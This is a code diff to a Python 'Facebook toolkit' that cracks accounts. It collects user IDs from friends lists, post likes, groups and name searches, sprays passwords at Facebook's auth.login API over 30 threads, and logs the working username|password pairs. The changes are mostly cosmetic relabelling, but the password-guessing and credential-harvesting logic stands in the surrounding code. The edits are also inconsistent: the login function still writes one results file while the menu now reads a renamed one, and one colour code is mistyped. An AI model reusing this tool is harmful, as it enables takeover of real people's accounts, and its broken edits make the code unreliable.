@@ -32,7 +32,7 @@ def masuk():
         try:
                 cek = open("cookies").read()
         except FileNotFoundError:
-                cek = input("[\033[1;32m>\033[0m ENTER COOKIE >>>> ")
+                cek = input("[\033[1;32m>\033[0m \033[1;93mENTER COOKIE\033[0m >>>> ")
         cek = {"cookie":cek}
         ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
         if "mbasic_logout_button" in str(ismi):
@@ -71,11 +71,11 @@ def login(username,password,cek=False):
         api = 'https://b-api.facebook.com/method/auth.login'
         response = requests.get(api, params=params)
         if 'EAA' in response.text:
-                print(f"\r[\033[1;32mLIFE\033[0m] {username} => {password}                       ",end="")
+                print(f"\r[\033[1;32mSUCCES\033[0m] {username} => {password}                       ",end="")
                 print()
                 result += 1
                 if cek:
-                        life.append(username+"|"+password)
+                        succes.append(username+"|"+password)
                 else:
                         with open('results-life.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
@@ -91,7 +91,7 @@ def login(username,password,cek=False):
         else:
                 die += 1
         for i in list('\|/-•'):
-                        print(f"\r[{i}] Life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
+                        print(f"\r[{i}] Succes : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
                         time.sleep(0.2)
 def getid(url):
         raw = requests.get(url,cookies=kuki).content
@@ -160,15 +160,15 @@ if __name__ == '__main__':
                 os.system("clear")
                 logo.banner()
                 print('\n\n\t\t≺ \033[1;36mFACEBOOK TOOLKIT\033[0m ≻\n\n')
-                print('\033[1;91m👉 \033[0m[\033[1;32m1\033[0m] LIST FRIENDS')
-                print('\033[1;91m👉 \033[0m [\033[1;32m2\033[0m] CRACK FROM LIKES\033[1;91m ')
-                print('👉 \033[0m[\033[1;32m3\033[0m] Crack From Search Name')
-                print('\033[1;91m👉 \033[0m[\033[1;32m4\033[0m] CRACK FROM GROUP ')
-                print('\033[1;91m👉 \033[0m[\033[1;32m5\033[0m] CRACK FROM FRIENDS')
-                print('\033[1;91m👉 \033[0m[\033[1;32m6\033[0m] RESULTS CHECKS')
+                print('\033[1;91m👉 \033[0m[\033[1;32m1\033[0m] \033[1;93mLIST FRIENDS\033[0m')
+                print('\033[1;91m👉\033[0m [\033[1;32m2\033[0m] \033[1;93mCRACK FROM LIKES\033[0m')
+                print('👉 \033[0m[\033[1;32m3\033[0m] \033[1;93mCRACK FROM SEARCH NAME\033[0m')
+                print('\033[1;91m👉 \033[0m[\033[1;32m4\033[0m] \033[1;93mCRACK FROM GROUP\033[0m ')
+                print('\033[1;91m👉 \033[0m[\033[1;32m5\033[0m] \033[1;93mCRACK FROM FRIENDS\033[0m')
+                print('\033[1;91m👉 \033[0m[\033[1;32m6\033[0m] \033[1;93mRESULTS CHECKS\033[0m')
                 print('\033[1;91m\033[0m\n')
                 print()
-                tanya = input('➛ ')
+                tanya = input('>>>>>>>>>>> ')
                 if tanya =="":
                         exit("[!] Dont be empty")
                 elif tanya == '1':
@@ -208,7 +208,7 @@ if __name__ == '__main__':
                 elif tanya == '6':
                         try:
                                 file1 = open("results-check.txt").read()
-                                file2 = open("results-life.txt").read()
+                                file2 = open("results-succes.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
@@ -218,24 +218,24 @@ if __name__ == '__main__':
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 os.remove("results-check.txt")
-                                os.remove("results-life.txt")
-                                for x in life:
-                                        with open('results-life.txt','a') as f:
+                                os.remove("results-succes.txt")
+                                for x in succes:
+                                        with open('results-succes.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('results-check.txt','a') as f:
                                                 f.write(x+"\n")
                                 
                                 print("\n# Done")
-                                print("# saved to results-check.txt results-life.txt")
+                                print("# saved to results-check.txt results-succes.txt")
                                 exit()
                         except FileNotFoundError:
                                 exit("# you not have a results")
                 else:
                         exit("# wrong choice")
                 print()
-                expass = input("[\033[1;32m>\033[0m] Extra Password : ")
-                print("# result will be saved in results-life.txt and results-check.txt")
+                expass = input("[\033[1;32m>\033[0m] \003[1;93mEXTRA PASSWORD\033[0m : ")
+                print("# result will be saved in results-succes.txt and results-check.txt")
                 with ThreadPoolExecutor(max_workers=30) as ex:
                         for user in username:
                                 users = user.split('|')
@@ -252,7 +252,7 @@ if __name__ == '__main__':
                                                 ex.submit(login,(users[1]),(passw))
                 if check != 0 or result != 0:
                         print("\n[\033[1;32m✔\033[0m Done. file saved in : ")
-                        print("        - life : results-life.txt")
+                        print("        - succes : results-succes.txt")
                         print("        - checkpoint : results-check.txt")
                         exit("# thanks for using this tools")
                 else:
